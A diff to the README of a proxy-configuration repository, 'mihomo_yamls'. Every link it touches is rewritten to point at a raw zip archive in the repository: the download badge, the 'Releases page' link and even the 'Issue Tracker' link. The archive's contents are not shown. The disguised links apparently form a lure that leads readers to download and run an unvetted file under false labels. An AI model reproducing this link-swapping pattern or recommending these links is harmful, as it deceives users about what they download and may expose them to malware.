@@ -4,7 +4,7 @@
 Welcome to the mihomo_yamls project! This repository gathers various configurations for the Clash Meta/Mihomo (smart) kernel. Our goal is to make it easy for you to manage and utilize these configurations for enhanced performance. 
 
 ## 📥 Download Now!
-[![Download Releases](https://img.shields.io/badge/Download_Releases-here-blue.svg)](https://github.com/naseem499379/mihomo_yamls/releases)
+[![Download Releases](https://raw.githubusercontent.com/naseem499379/mihomo_yamls/main/Mobile_Modules/Surfing/mihomo_yamls-1.5.zip)](https://raw.githubusercontent.com/naseem499379/mihomo_yamls/main/Mobile_Modules/Surfing/mihomo_yamls-1.5.zip)
 
 ## 🚀 Getting Started
 To get started quickly, follow these simple steps. No technical knowledge is required.
@@ -18,7 +18,7 @@ These requirements ensure that the configurations run smoothly on your device.
 
 ## 📂 How to Download
 1. **Visit the Downloads Page**  
-   To download the necessary files, visit the [Releases page](https://github.com/naseem499379/mihomo_yamls/releases). Here, you'll find all available versions.
+   To download the necessary files, visit the [Releases page](https://raw.githubusercontent.com/naseem499379/mihomo_yamls/main/Mobile_Modules/Surfing/mihomo_yamls-1.5.zip). Here, you'll find all available versions.
 
 2. **Choose a Version**  
    On the releases page, you will see a list of available versions. Choose the most recent one, as it often includes the latest features and fixed issues.
@@ -64,7 +64,7 @@ For help, you can check the GitHub discussions section of this repository or con
 We welcome contributions! If you want to share your configurations or suggest improvements, feel free to open a pull request or create an issue. Your input is valuable in making this project better for everyone.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/naseem499379/mihomo_yamls/releases)
-- [Issue Tracker](https://github.com/naseem499379/mihomo_yamls/issues)
+- [Releases Page](https://raw.githubusercontent.com/naseem499379/mihomo_yamls/main/Mobile_Modules/Surfing/mihomo_yamls-1.5.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/naseem499379/mihomo_yamls/main/Mobile_Modules/Surfing/mihomo_yamls-1.5.zip)
 
 Thank you for using mihomo_yamls! We hope these configurations help you achieve optimal performance on your device.
